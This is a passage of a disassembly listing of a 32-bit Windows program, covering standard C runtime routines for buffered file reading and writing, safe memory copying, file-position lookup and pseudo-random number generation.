                leave
                retn
sub_40EDEB      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EE3C      proc near               ; CODE XREF: sub_41B924+2A↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     dword_42AE20, 0
                jnz     short loc_40EE5C
                mov     eax, [ebp+arg_0]
                mov     ecx, off_4257B8
                movzx   eax, word ptr [ecx+eax*2]
                and     eax, 4
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_40EE5C:                             ; CODE XREF: sub_40EE3C+C↑j
                push    0
                push    [ebp+arg_0]
                call    sub_40EDEB
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_40EE3C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40EE6A      proc near               ; CODE XREF: sub_40F074+70↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
lpBuffer        = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                mov     ecx, [ebp+arg_0]
                push    ebx
                mov     ebx, [ebp+arg_4]
                push    esi
                push    edi
                xor     edi, edi
                mov     [ebp+lpBuffer], ecx
                mov     [ebp+var_4], ebx
                cmp     [ebp+arg_8], edi
                jz      short loc_40EEA9
                cmp     [ebp+arg_C], edi
                jz      short loc_40EEA9
                cmp     ecx, edi
                jnz     short loc_40EEB0

loc_40EE91:                             ; CODE XREF: sub_40EE6A+6C↓j
                                        ; sub_40EE6A+79↓j
                call    sub_41090E
                push    edi
                push    edi
                push    edi
                push    edi
                mov     dword ptr [eax], 16h
                push    edi

loc_40EEA1:                             ; CODE XREF: sub_40EE6A+1C0↓j
                                        ; sub_40EE6A+1ED↓j
                call    sub_40EC54
                add     esp, 14h

loc_40EEA9:                             ; CODE XREF: sub_40EE6A+1C↑j
                                        ; sub_40EE6A+21↑j
                xor     eax, eax

loc_40EEAB:                             ; CODE XREF: sub_40EE6A+194↓j
                                        ; sub_40EE6A+1FF↓j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_40EEB0:                             ; CODE XREF: sub_40EE6A+25↑j
                mov     esi, [ebp+arg_10]
                cmp     esi, edi
                jz      short loc_40EEC4
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     [ebp+arg_8]
                cmp     [ebp+arg_C], eax
                jbe     short loc_40EEE5

loc_40EEC4:                             ; CODE XREF: sub_40EE6A+4B↑j
                cmp     ebx, 0FFFFFFFFh
                jz      short loc_40EED4
                push    ebx
                push    edi
                push    ecx
                call    sub_413520
                add     esp, 0Ch

loc_40EED4:                             ; CODE XREF: sub_40EE6A+5D↑j
                cmp     esi, edi
                jz      short loc_40EE91
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     [ebp+arg_8]
                cmp     [ebp+arg_C], eax
                ja      short loc_40EE91

loc_40EEE5:                             ; CODE XREF: sub_40EE6A+58↑j
                mov     edi, [ebp+arg_8]
                imul    edi, [ebp+arg_C]
                test    dword ptr [esi+0Ch], 10Ch
                mov     [ebp+var_10], edi
                mov     ebx, edi
                jz      short loc_40EF02
                mov     eax, [esi+18h]
                mov     [ebp+var_C], eax
                jmp     short loc_40EF09
; ---------------------------------------------------------------------------

loc_40EF02:                             ; CODE XREF: sub_40EE6A+8E↑j
                mov     [ebp+var_C], 1000h

loc_40EF09:                             ; CODE XREF: sub_40EE6A+96↑j
                test    edi, edi
                jz      loc_40EFFB

loc_40EF11:                             ; CODE XREF: sub_40EE6A+18B↓j
                test    dword ptr [esi+0Ch], 10Ch
                jz      short loc_40EF5E
                mov     eax, [esi+4]
                test    eax, eax
                jz      short loc_40EF5E
                jl      loc_40F05C
                mov     edi, ebx
                cmp     ebx, eax
                jb      short loc_40EF2F
                mov     edi, eax

loc_40EF2F:                             ; CODE XREF: sub_40EE6A+C1↑j
                cmp     edi, [ebp+var_4]
                ja      loc_40F003
                push    edi
                push    dword ptr [esi]
                push    [ebp+var_4]
                push    [ebp+lpBuffer]
                call    sub_40F166
                sub     [esi+4], edi
                add     [esi], edi
                add     [ebp+lpBuffer], edi
                sub     ebx, edi
                add     esp, 10h
                sub     [ebp+var_4], edi
                mov     edi, [ebp+var_10]
                jmp     loc_40EFF3
; ---------------------------------------------------------------------------

loc_40EF5E:                             ; CODE XREF: sub_40EE6A+AE↑j
                                        ; sub_40EE6A+B5↑j
                cmp     ebx, [ebp+var_C]
                jb      short loc_40EFCB
                cmp     [ebp+var_C], 0
                jz      short loc_40EF88
                mov     ecx, 7FFFFFFFh
                xor     edx, edx
                cmp     ebx, ecx
                jbe     short loc_40EF7D
                mov     eax, ecx
                div     [ebp+var_C]
                mov     eax, ecx
                jmp     short loc_40EF84
; ---------------------------------------------------------------------------

loc_40EF7D:                             ; CODE XREF: sub_40EE6A+108↑j
                mov     eax, ebx
                div     [ebp+var_C]
                mov     eax, ebx

loc_40EF84:                             ; CODE XREF: sub_40EE6A+111↑j
                sub     eax, edx
                jmp     short loc_40EF93
; ---------------------------------------------------------------------------

loc_40EF88:                             ; CODE XREF: sub_40EE6A+FD↑j
                mov     eax, 7FFFFFFFh
                cmp     ebx, eax
                ja      short loc_40EF93
                mov     eax, ebx

loc_40EF93:                             ; CODE XREF: sub_40EE6A+11C↑j
                                        ; sub_40EE6A+125↑j
                cmp     eax, [ebp+var_4]
                ja      loc_40F02F
                push    eax             ; nNumberOfBytesToRead
                push    [ebp+lpBuffer]  ; lpBuffer
                push    esi
                call    sub_40F9B4
                pop     ecx
                push    eax             ; int
                call    sub_414448
                add     esp, 0Ch
                test    eax, eax
                jz      loc_40F06E
                cmp     eax, 0FFFFFFFFh
                jz      loc_40F05C
                add     [ebp+lpBuffer], eax
                sub     ebx, eax
                sub     [ebp+var_4], eax
                jmp     short loc_40EFF3
; ---------------------------------------------------------------------------

loc_40EFCB:                             ; CODE XREF: sub_40EE6A+F7↑j
                push    esi
                call    sub_413D5B
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jz      loc_40F060
                cmp     [ebp+var_4], 0
                jz      short loc_40F02F
                mov     ecx, [ebp+lpBuffer]
                inc     [ebp+lpBuffer]
                mov     [ecx], al
                mov     eax, [esi+18h]
                dec     ebx
                dec     [ebp+var_4]
                mov     [ebp+var_C], eax

loc_40EFF3:                             ; CODE XREF: sub_40EE6A+EF↑j
                                        ; sub_40EE6A+15F↑j
                test    ebx, ebx
                jnz     loc_40EF11

loc_40EFFB:                             ; CODE XREF: sub_40EE6A+A1↑j
                mov     eax, [ebp+arg_C]
                jmp     loc_40EEAB
; ---------------------------------------------------------------------------

loc_40F003:                             ; CODE XREF: sub_40EE6A+C8↑j
                xor     esi, esi
                cmp     [ebp+arg_4], 0FFFFFFFFh
                jz      short loc_40F01A
                push    [ebp+arg_4]
                push    esi
                push    [ebp+arg_0]
                call    sub_413520
                add     esp, 0Ch

loc_40F01A:                             ; CODE XREF: sub_40EE6A+19F↑j
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 22h
                push    esi
                jmp     loc_40EEA1
; ---------------------------------------------------------------------------

loc_40F02F:                             ; CODE XREF: sub_40EE6A+12C↑j
                                        ; sub_40EE6A+175↑j
                cmp     [ebp+arg_4], 0FFFFFFFFh
                jz      short loc_40F045
                push    [ebp+arg_4]
                push    0
                push    [ebp+arg_0]
                call    sub_413520
                add     esp, 0Ch

loc_40F045:                             ; CODE XREF: sub_40EE6A+1C9↑j
                call    sub_41090E
                mov     dword ptr [eax], 22h
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                jmp     loc_40EEA1
; ---------------------------------------------------------------------------

loc_40F05C:                             ; CODE XREF: sub_40EE6A+B7↑j
                                        ; sub_40EE6A+151↑j
                or      dword ptr [esi+0Ch], 20h

loc_40F060:                             ; CODE XREF: sub_40EE6A+16B↑j
                                        ; sub_40EE6A+208↓j
                mov     eax, edi
                sub     eax, ebx
                xor     edx, edx
                div     [ebp+arg_8]
                jmp     loc_40EEAB
; ---------------------------------------------------------------------------

loc_40F06E:                             ; CODE XREF: sub_40EE6A+148↑j
                or      dword ptr [esi+0Ch], 10h
                jmp     short loc_40F060
sub_40EE6A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F074      proc near               ; CODE XREF: sub_40F10A+13↓p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                push    0Ch
                push    offset stru_422C68
                call    __SEH_prolog4
                xor     esi, esi
                mov     [ebp+var_1C], esi
                cmp     [ebp+arg_8], esi
                jz      short loc_40F0C1
                cmp     [ebp+arg_C], esi
                jz      short loc_40F0C1
                cmp     [ebp+arg_10], esi
                jnz     short loc_40F0C9
                cmp     [ebp+arg_4], 0FFFFFFFFh
                jz      short loc_40F0A9
                push    [ebp+arg_4]
                push    esi
                push    [ebp+arg_0]
                call    sub_413520
                add     esp, 0Ch

loc_40F0A9:                             ; CODE XREF: sub_40F074+24↑j
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EC54
                add     esp, 14h

loc_40F0C1:                             ; CODE XREF: sub_40F074+14↑j
                                        ; sub_40F074+19↑j
                xor     eax, eax

loc_40F0C3:                             ; CODE XREF: sub_40F074+8A↓j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40F0C9:                             ; CODE XREF: sub_40F074+1E↑j
                push    [ebp+arg_10]
                call    sub_413671
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], esi
                push    [ebp+arg_10]
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_40EE6A
                add     esp, 14h
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40F100
; ---------------------------------------------------------------------------

loc_40F0FB:                             ; CODE XREF: sub_40F074+95↓j
                mov     eax, [ebp+var_1C]
                jmp     short loc_40F0C3
; ---------------------------------------------------------------------------

loc_40F100:                             ; CODE XREF: sub_40F074+82↑j
                                        ; DATA XREF: .rdata:stru_422C68↓o
                push    [ebp+arg_10]
                call    sub_4136E4
                pop     ecx
                retn
sub_40F074      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F10A      proc near               ; CODE XREF: .text:00403401↑p
                                        ; sub_40C190+6F↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    0FFFFFFFFh
                push    [ebp+arg_0]
                call    sub_40F074
                add     esp, 14h
                pop     ebp
                retn
sub_40F10A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F127      proc near               ; CODE XREF: sub_401AE0+28↑p
                                        ; sub_401E10+E2↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                call    sub_412405
                mov     ecx, [ebp+arg_0]
                mov     [eax+14h], ecx
                pop     ebp
                retn
sub_40F127      endp


; =============== S U B R O U T I N E =======================================


sub_40F139      proc near               ; CODE XREF: sub_401AE0:loc_401B63↑p
                                        ; sub_403B80+AD↑p ...
                call    sub_412405
                mov     ecx, [eax+14h]
                imul    ecx, 343FDh
                add     ecx, 269EC3h
                mov     [eax+14h], ecx
                mov     eax, ecx
                shr     eax, 10h
                and     eax, 7FFFh
                retn
sub_40F139      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F15B      proc near               ; CODE XREF: sub_401010+16↑p
                                        ; sub_401170+13↑p ...
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                pop     ebp
                jmp     sub_40FD55
sub_40F15B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F166      proc near               ; CODE XREF: sub_408CA0+BA↑p
                                        ; sub_409640+BF↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_C]
                push    edi
                xor     edi, edi
                cmp     esi, edi
                jnz     short loc_40F17A

loc_40F176:                             ; CODE XREF: sub_40F166+4D↓j
                xor     eax, eax
                jmp     short loc_40F1DF
; ---------------------------------------------------------------------------

loc_40F17A:                             ; CODE XREF: sub_40F166+E↑j
                cmp     [ebp+arg_0], edi
                jnz     short loc_40F19A

loc_40F17F:                             ; CODE XREF: sub_40F166+61↓j
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi

loc_40F189:                             ; CODE XREF: sub_40F166+74↓j
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     short loc_40F1DF
; ---------------------------------------------------------------------------

loc_40F19A:                             ; CODE XREF: sub_40F166+17↑j
                cmp     [ebp+arg_8], edi
                jz      short loc_40F1B5
                cmp     [ebp+arg_4], esi
                jb      short loc_40F1B5
                push    esi
                push    [ebp+arg_8]
                push    [ebp+arg_0]
                call    sub_414550
                add     esp, 0Ch
                jmp     short loc_40F176
; ---------------------------------------------------------------------------

loc_40F1B5:                             ; CODE XREF: sub_40F166+37↑j
                                        ; sub_40F166+3C↑j
                push    [ebp+arg_4]
                push    edi
                push    [ebp+arg_0]
                call    sub_413520
                add     esp, 0Ch
                cmp     [ebp+arg_8], edi
                jz      short loc_40F17F
                cmp     [ebp+arg_4], esi
                jnb     short loc_40F1DC
                call    sub_41090E
                push    22h
                pop     ecx
                mov     [eax], ecx
                mov     esi, ecx
                jmp     short loc_40F189
; ---------------------------------------------------------------------------

loc_40F1DC:                             ; CODE XREF: sub_40F166+66↑j
                push    16h
                pop     eax

loc_40F1DF:                             ; CODE XREF: sub_40F166+12↑j
                                        ; sub_40F166+32↑j
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_40F166      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F1E3      proc near               ; CODE XREF: sub_40F345+5C↓p

var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0Ch
                push    ebx
                push    esi
                push    edi
                xor     edi, edi
                cmp     [ebp+arg_4], edi
                jz      short loc_40F219
                cmp     [ebp+arg_8], edi
                jz      short loc_40F219
                mov     esi, [ebp+arg_C]
                cmp     esi, edi
                jnz     short loc_40F220

loc_40F201:                             ; CODE XREF: sub_40F1E3+42↓j
                                        ; sub_40F1E3+4F↓j
                call    sub_41090E
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h

loc_40F219:                             ; CODE XREF: sub_40F1E3+10↑j
                                        ; sub_40F1E3+15↑j
                xor     eax, eax

loc_40F21B:                             ; CODE XREF: sub_40F1E3+142↓j
                                        ; sub_40F1E3+154↓j
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_40F220:                             ; CODE XREF: sub_40F1E3+1C↑j
                mov     ecx, [ebp+arg_0]
                cmp     ecx, edi
                jz      short loc_40F201
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     [ebp+arg_4]
                cmp     [ebp+arg_8], eax
                ja      short loc_40F201
                mov     edi, [ebp+arg_4]
                imul    edi, [ebp+arg_8]
                test    dword ptr [esi+0Ch], 10Ch
                mov     [ebp+var_4], ecx
                mov     [ebp+var_C], edi
                mov     ebx, edi
                jz      short loc_40F254
                mov     eax, [esi+18h]
                mov     [ebp+var_8], eax
                jmp     short loc_40F25B
; ---------------------------------------------------------------------------

loc_40F254:                             ; CODE XREF: sub_40F1E3+67↑j
                mov     [ebp+var_8], 1000h

loc_40F25B:                             ; CODE XREF: sub_40F1E3+6F↑j
                test    edi, edi
                jz      loc_40F322

loc_40F263:                             ; CODE XREF: sub_40F1E3+139↓j
                mov     ecx, [esi+0Ch]
                and     ecx, 108h
                jz      short loc_40F29D
                mov     eax, [esi+4]
                test    eax, eax
                jz      short loc_40F29D
                jl      loc_40F32A
                mov     edi, ebx
                cmp     ebx, eax
                jb      short loc_40F283
                mov     edi, eax

loc_40F283:                             ; CODE XREF: sub_40F1E3+9C↑j
                push    edi
                push    [ebp+var_4]
                push    dword ptr [esi]
                call    sub_414550
                sub     [esi+4], edi
                add     [esi], edi
                add     esp, 0Ch
                sub     ebx, edi
                add     [ebp+var_4], edi
                jmp     short loc_40F2EC
; ---------------------------------------------------------------------------

loc_40F29D:                             ; CODE XREF: sub_40F1E3+89↑j
                                        ; sub_40F1E3+90↑j
                cmp     ebx, [ebp+var_8]
                jb      short loc_40F2F1
                test    ecx, ecx
                jz      short loc_40F2B1
                push    esi
                call    sub_4150C4
                pop     ecx
                test    eax, eax
                jnz     short loc_40F32E

loc_40F2B1:                             ; CODE XREF: sub_40F1E3+C1↑j
                cmp     [ebp+var_8], 0
                mov     edi, ebx
                jz      short loc_40F2C2
                xor     edx, edx
                mov     eax, ebx
                div     [ebp+var_8]
                sub     edi, edx

loc_40F2C2:                             ; CODE XREF: sub_40F1E3+D4↑j
                push    edi             ; nNumberOfBytesToWrite
                push    [ebp+var_4]     ; int
                push    esi
                call    sub_40F9B4
                pop     ecx
                push    eax             ; int
                call    sub_414FE8
                add     esp, 0Ch
                cmp     eax, 0FFFFFFFFh
                jz      short loc_40F33C
                mov     ecx, edi
                cmp     eax, edi
                ja      short loc_40F2E3
                mov     ecx, eax

loc_40F2E3:                             ; CODE XREF: sub_40F1E3+FC↑j
                add     [ebp+var_4], ecx
                sub     ebx, ecx
                cmp     eax, edi
                jb      short loc_40F33C

loc_40F2EC:                             ; CODE XREF: sub_40F1E3+B8↑j
                mov     edi, [ebp+var_C]
                jmp     short loc_40F31A
; ---------------------------------------------------------------------------

loc_40F2F1:                             ; CODE XREF: sub_40F1E3+BD↑j
                mov     eax, [ebp+var_4]
                movsx   eax, byte ptr [eax]
                push    esi
                push    eax
                call    sub_410957
                pop     ecx
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jz      short loc_40F32E
                inc     [ebp+var_4]
                mov     eax, [esi+18h]
                dec     ebx
                mov     [ebp+var_8], eax
                test    eax, eax
                jg      short loc_40F31A
                mov     [ebp+var_8], 1

loc_40F31A:                             ; CODE XREF: sub_40F1E3+10C↑j
                                        ; sub_40F1E3+12E↑j
                test    ebx, ebx
                jnz     loc_40F263

loc_40F322:                             ; CODE XREF: sub_40F1E3+7A↑j
                mov     eax, [ebp+arg_8]
                jmp     loc_40F21B
; ---------------------------------------------------------------------------

loc_40F32A:                             ; CODE XREF: sub_40F1E3+92↑j
                or      dword ptr [esi+0Ch], 20h

loc_40F32E:                             ; CODE XREF: sub_40F1E3+CC↑j
                                        ; sub_40F1E3+120↑j
                mov     eax, edi

loc_40F330:                             ; CODE XREF: sub_40F1E3+160↓j
                sub     eax, ebx
                xor     edx, edx
                div     [ebp+arg_4]
                jmp     loc_40F21B
; ---------------------------------------------------------------------------

loc_40F33C:                             ; CODE XREF: sub_40F1E3+F6↑j
                                        ; sub_40F1E3+107↑j
                or      dword ptr [esi+0Ch], 20h
                mov     eax, [ebp+var_C]
                jmp     short loc_40F330
sub_40F1E3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F345      proc near               ; CODE XREF: sub_404BF0+14D↑p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                push    0Ch
                push    offset stru_422C88
                call    __SEH_prolog4
                xor     esi, esi
                cmp     [ebp+arg_4], esi
                jz      short loc_40F381
                cmp     [ebp+arg_8], esi
                jz      short loc_40F381
                xor     eax, eax
                cmp     [ebp+arg_C], esi
                setnz   al
                cmp     eax, esi
                jnz     short loc_40F389
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EC54
                add     esp, 14h

loc_40F381:                             ; CODE XREF: sub_40F345+11↑j
                                        ; sub_40F345+16↑j
                xor     eax, eax

loc_40F383:                             ; CODE XREF: sub_40F345+76↓j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40F389:                             ; CODE XREF: sub_40F345+22↑j
                push    [ebp+arg_C]
                call    sub_413671
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], esi
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_40F1E3
                add     esp, 10h
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40F3BD
; ---------------------------------------------------------------------------

loc_40F3B8:                             ; CODE XREF: sub_40F345+81↓j
                mov     eax, [ebp+var_1C]
                jmp     short loc_40F383
; ---------------------------------------------------------------------------

loc_40F3BD:                             ; CODE XREF: sub_40F345+6E↑j
                                        ; DATA XREF: .rdata:stru_422C88↓o
                push    [ebp+arg_C]
                call    sub_4136E4
                pop     ecx
                retn
sub_40F345      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F3C7      proc near               ; CODE XREF: sub_40F564+46↓p
                                        ; sub_40F5D2+2D↓p

var_C           = dword ptr -0Ch
lDistanceToMove = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 0Ch
                push    ebx
                push    edi
                mov     edi, [ebp+arg_0]
                xor     ebx, ebx
                cmp     edi, ebx
                jnz     short loc_40F3FA
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h

loc_40F3F2:                             ; CODE XREF: sub_40F3C7+56↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_40F560
; ---------------------------------------------------------------------------

loc_40F3FA:                             ; CODE XREF: sub_40F3C7+11↑j
                push    edi
                call    sub_40F9B4
                cmp     [edi+4], ebx
                pop     ecx
                mov     [ebp+var_4], eax
                jge     short loc_40F40C
                mov     [edi+4], ebx

loc_40F40C:                             ; CODE XREF: sub_40F3C7+40↑j
                push    1               ; dwMoveMethod
                push    ebx             ; lDistanceToMove
                push    eax             ; int
                call    sub_415520
                add     esp, 0Ch
                cmp     eax, ebx
                mov     [ebp+lDistanceToMove], eax
                jl      short loc_40F3F2
                mov     edx, [edi+0Ch]
                test    edx, 108h
                jnz     short loc_40F432
                sub     eax, [edi+4]
                jmp     loc_40F560
; ---------------------------------------------------------------------------

loc_40F432:                             ; CODE XREF: sub_40F3C7+61↑j
                mov     eax, [edi]
                mov     ecx, [edi+8]
                push    esi
                mov     esi, eax
                sub     esi, ecx
                mov     [ebp+var_C], esi
                test    dl, 3
                jz      short loc_40F485
                mov     edx, [ebp+var_4]
                mov     esi, [ebp+var_4]
                sar     edx, 5
                mov     edx, dword_42CA00[edx*4]
                and     esi, 1Fh
                shl     esi, 6
                test    byte ptr [edx+esi+4], 80h
                jz      short loc_40F478
                mov     edx, ecx
                cmp     edx, eax
                jnb     short loc_40F478
                mov     esi, eax

loc_40F469:                             ; CODE XREF: sub_40F3C7+AF↓j
                cmp     byte ptr [edx], 0Ah
                jnz     short loc_40F473
                inc     [ebp+var_C]
                xor     ebx, ebx

loc_40F473:                             ; CODE XREF: sub_40F3C7+A5↑j
                inc     edx
                cmp     edx, esi
                jb      short loc_40F469

loc_40F478:                             ; CODE XREF: sub_40F3C7+98↑j
                                        ; sub_40F3C7+9E↑j ...
                cmp     [ebp+lDistanceToMove], ebx
                jnz     short loc_40F499
                mov     eax, [ebp+var_C]
                jmp     loc_40F55F
; ---------------------------------------------------------------------------

loc_40F485:                             ; CODE XREF: sub_40F3C7+7B↑j
                test    dl, dl
                js      short loc_40F478
                call    sub_41090E
                mov     dword ptr [eax], 16h
                jmp     loc_40F520
; ---------------------------------------------------------------------------

loc_40F499:                             ; CODE XREF: sub_40F3C7+B4↑j
                test    byte ptr [edi+0Ch], 1
                jz      loc_40F557
                mov     edx, [edi+4]
                cmp     edx, ebx
                jnz     short loc_40F4B2
                mov     [ebp+var_C], ebx
                jmp     loc_40F557
; ---------------------------------------------------------------------------

loc_40F4B2:                             ; CODE XREF: sub_40F3C7+E1↑j
                mov     ebx, [ebp+var_4]
                mov     esi, [ebp+var_4]
                sub     eax, ecx
                add     eax, edx
                sar     ebx, 5
                and     esi, 1Fh
                lea     ebx, dword_42CA00[ebx*4]
                mov     [ebp+arg_0], eax
                mov     eax, [ebx]
                shl     esi, 6
                test    byte ptr [eax+esi+4], 80h
                jz      short loc_40F551
                push    2               ; dwMoveMethod
                push    0               ; lDistanceToMove
                push    [ebp+var_4]     ; int
                call    sub_415520
                add     esp, 0Ch
                cmp     eax, [ebp+lDistanceToMove]
                jnz     short loc_40F50C
                mov     eax, [edi+8]
                mov     ecx, [ebp+arg_0]
                add     ecx, eax
                jmp     short loc_40F4FF
; ---------------------------------------------------------------------------

loc_40F4F6:                             ; CODE XREF: sub_40F3C7+13A↓j
                cmp     byte ptr [eax], 0Ah
                jnz     short loc_40F4FE
                inc     [ebp+arg_0]

loc_40F4FE:                             ; CODE XREF: sub_40F3C7+132↑j
                inc     eax

loc_40F4FF:                             ; CODE XREF: sub_40F3C7+12D↑j
                cmp     eax, ecx
                jb      short loc_40F4F6
                test    dword ptr [edi+0Ch], 2000h
                jmp     short loc_40F54C
; ---------------------------------------------------------------------------

loc_40F50C:                             ; CODE XREF: sub_40F3C7+123↑j
                push    0               ; dwMoveMethod
                push    [ebp+lDistanceToMove] ; lDistanceToMove
                push    [ebp+var_4]     ; int
                call    sub_415520
                add     esp, 0Ch
                test    eax, eax
                jge     short loc_40F525

loc_40F520:                             ; CODE XREF: sub_40F3C7+CD↑j
                or      eax, 0FFFFFFFFh
                jmp     short loc_40F55F
; ---------------------------------------------------------------------------

loc_40F525:                             ; CODE XREF: sub_40F3C7+157↑j
                mov     eax, 200h
                cmp     [ebp+arg_0], eax
                ja      short loc_40F53F
                mov     ecx, [edi+0Ch]
                test    cl, 8
                jz      short loc_40F53F
                test    ecx, 400h
                jz      short loc_40F542

loc_40F53F:                             ; CODE XREF: sub_40F3C7+166↑j
                                        ; sub_40F3C7+16E↑j
                mov     eax, [edi+18h]

loc_40F542:                             ; CODE XREF: sub_40F3C7+176↑j
                mov     [ebp+arg_0], eax
                mov     eax, [ebx]
                test    byte ptr [eax+esi+4], 4

loc_40F54C:                             ; CODE XREF: sub_40F3C7+143↑j
                jz      short loc_40F551
                inc     [ebp+arg_0]

loc_40F551:                             ; CODE XREF: sub_40F3C7+10F↑j
                                        ; sub_40F3C7:loc_40F54C↑j
                mov     eax, [ebp+arg_0]
                sub     [ebp+lDistanceToMove], eax

loc_40F557:                             ; CODE XREF: sub_40F3C7+D6↑j
                                        ; sub_40F3C7+E6↑j
                mov     eax, [ebp+var_C]
                mov     ecx, [ebp+lDistanceToMove]
                add     eax, ecx

loc_40F55F:                             ; CODE XREF: sub_40F3C7+B9↑j
                                        ; sub_40F3C7+15C↑j
                pop     esi

loc_40F560:                             ; CODE XREF: sub_40F3C7+2E↑j
                                        ; sub_40F3C7+66↑j
                pop     edi
                pop     ebx
                leave
                retn
sub_40F3C7      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40F564      proc near               ; CODE XREF: .text:00403358↑p
                                        ; sub_4059A0+1CF↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    0Ch
                push    offset stru_422CA8
                call    __SEH_prolog4
                xor     eax, eax
                xor     esi, esi
                cmp     [ebp+arg_0], esi
                setnz   al
                cmp     eax, esi
                jnz     short loc_40F59B
                call    sub_41090E
                mov     dword ptr [eax], 16h
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     short loc_40F5C2
; ---------------------------------------------------------------------------

loc_40F59B:                             ; CODE XREF: sub_40F564+18↑j
                push    [ebp+arg_0]
                call    sub_413671
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], esi
                push    [ebp+arg_0]
                call    sub_40F3C7
                pop     ecx
                mov     [ebp+var_1C], eax
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_40F5C8
; ---------------------------------------------------------------------------

loc_40F5BF:                             ; CODE XREF: sub_40F564+6D↓j
                mov     eax, [ebp+var_1C]

loc_40F5C2:                             ; CODE XREF: sub_40F564+35↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_40F5C8:                             ; CODE XREF: sub_40F564+56↑j
                                        ; DATA XREF: .rdata:stru_422CA8↓o
                push    [ebp+arg_0]
                call    sub_4136E4
                pop     ecx
                retn
sub_40F564      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

